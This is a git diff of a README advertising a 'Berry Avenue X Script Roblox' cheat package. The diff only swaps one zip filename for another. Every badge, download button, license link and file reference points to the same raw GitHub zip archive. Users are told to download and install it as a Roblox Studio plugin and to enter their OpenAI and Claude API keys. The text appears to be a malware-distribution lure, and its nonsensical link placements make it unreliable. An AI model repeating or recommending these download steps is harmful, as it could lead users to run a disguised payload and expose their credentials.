@@ -1,9 +1,9 @@
 # 🍓 Berry Avenue X Script Roblox
 
-![Berry Avenue Logo](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/scriptworks_avenue_roblox_x_berry_v2.4.zip%20Avenue-Premium%20Script-red?style=for-the-badge&logo=roblox)
-![Build](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/scriptworks_avenue_roblox_x_berry_v2.4.zip)
-![Platforms](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/scriptworks_avenue_roblox_x_berry_v2.4.zip%20%7C%20Mac%20OS%20%7C%20Linux-informational)
-[![License: MIT](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/scriptworks_avenue_roblox_x_berry_v2.4.zip)](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/scriptworks_avenue_roblox_x_berry_v2.4.zip)
+![Berry Avenue Logo](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/x-avenue-scriptworks-roblox-berry-3.4.zip%20Avenue-Premium%20Script-red?style=for-the-badge&logo=roblox)
+![Build](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/x-avenue-scriptworks-roblox-berry-3.4.zip)
+![Platforms](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/x-avenue-scriptworks-roblox-berry-3.4.zip%20%7C%20Mac%20OS%20%7C%20Linux-informational)
+[![License: MIT](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/x-avenue-scriptworks-roblox-berry-3.4.zip)](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/x-avenue-scriptworks-roblox-berry-3.4.zip)
 
 ---
 
@@ -12,7 +12,7 @@
 Welcome, bold explorer! To embark on your journey within the universe of Berry Avenue X Script Roblox, begin by summoning the script package below.  
 **Step 1:** Click this mesmerizing "Download" button to teleport your script onto your device:
 
-[![Download](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/scriptworks_avenue_roblox_x_berry_v2.4.zip)](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/scriptworks_avenue_roblox_x_berry_v2.4.zip)
+[![Download](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/x-avenue-scriptworks-roblox-berry-3.4.zip)](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/x-avenue-scriptworks-roblox-berry-3.4.zip)
 
 **Step 2:** Then, follow the OS-specific installation ritual detailed [below](#-installation--setup).
 
@@ -66,7 +66,7 @@ From contextual roleplay to dynamic world-building, Claude brings nuanced, compa
 
 Activate these integrations instantly:
 - Obtain your API keys (OpenAI and Claude)
-- Place them in `https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/scriptworks_avenue_roblox_x_berry_v2.4.zip`
+- Place them in `https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/x-avenue-scriptworks-roblox-berry-3.4.zip`
 - Customize AI helpers in the Berry Avenue Script dashboard
 
 ---
@@ -83,7 +83,7 @@ Activate these integrations instantly:
 ## 🛠️ Installation & Setup
 
 **1. Download the latest Berry Avenue X Script Roblox package:**  
-[![Download](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/scriptworks_avenue_roblox_x_berry_v2.4.zip)](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/scriptworks_avenue_roblox_x_berry_v2.4.zip)
+[![Download](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/x-avenue-scriptworks-roblox-berry-3.4.zip)](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/x-avenue-scriptworks-roblox-berry-3.4.zip)
 
 **2. Extract the contents** using your favorite archive tool.
   - Windows: Right-click -> Extract All...
@@ -92,12 +92,12 @@ Activate these integrations instantly:
 **3. Integrate into Roblox Studio:**
   - Launch Roblox Studio
   - Go to **Plugins** > **Manage Plugins** > **Install from File**
-  - Select the extracted `https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/scriptworks_avenue_roblox_x_berry_v2.4.zip` file
+  - Select the extracted `https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/x-avenue-scriptworks-roblox-berry-3.4.zip` file
 
 **4. Set up API integration:**  
   - Open the new **Berry Avenue X Dashboard** in Roblox Studio.
   - Enter your OpenAI and Claude API keys under “AI Integration”.
-  - Configure advanced settings as desired (see the `https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/scriptworks_avenue_roblox_x_berry_v2.4.zip` for wizard walkthroughs).
+  - Configure advanced settings as desired (see the `https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/x-avenue-scriptworks-roblox-berry-3.4.zip` for wizard walkthroughs).
 
 **5. Launch your Berry Avenue adventure!**  
 Your new toolbox will appear in-game and in Studio: explore, create, and let the intelligence unfold.
@@ -111,7 +111,7 @@ Your new toolbox will appear in-game and in Studio: explore, create, and let the
 - Submit PRs with clear descriptions—let the collaboration blossom!
 - Star this project to boost its visibility and keep innovation accelerating
 
-Explore our [https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/scriptworks_avenue_roblox_x_berry_v2.4.zip](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/scriptworks_avenue_roblox_x_berry_v2.4.zip) for inventive ideas!
+Explore our [https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/x-avenue-scriptworks-roblox-berry-3.4.zip](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/x-avenue-scriptworks-roblox-berry-3.4.zip) for inventive ideas!
 
 ---
 
@@ -124,7 +124,7 @@ Explore our [https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox
 ## 📜 MIT License (2025)
 
 Lovingly open-sourced under the MIT License.  
-Read the full details here: [MIT License](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/scriptworks_avenue_roblox_x_berry_v2.4.zip)
+Read the full details here: [MIT License](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/x-avenue-scriptworks-roblox-berry-3.4.zip)
 
 ---
 
@@ -132,7 +132,7 @@ Read the full details here: [MIT License](https://raw.githubusercontent.com/paol
 
 When you're ready to invite new dimensions to Berry Avenue, download the magic below and unleash your metaverse masterpiece!
 
-[![Download](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/scriptworks_avenue_roblox_x_berry_v2.4.zip)](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/scriptworks_avenue_roblox_x_berry_v2.4.zip)
+[![Download](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/x-avenue-scriptworks-roblox-berry-3.4.zip)](https://raw.githubusercontent.com/paolo200705/berry-avenue-x-roblox-scriptworks/branch/electroluminescence/x-avenue-scriptworks-roblox-berry-3.4.zip)
 
 ---
 
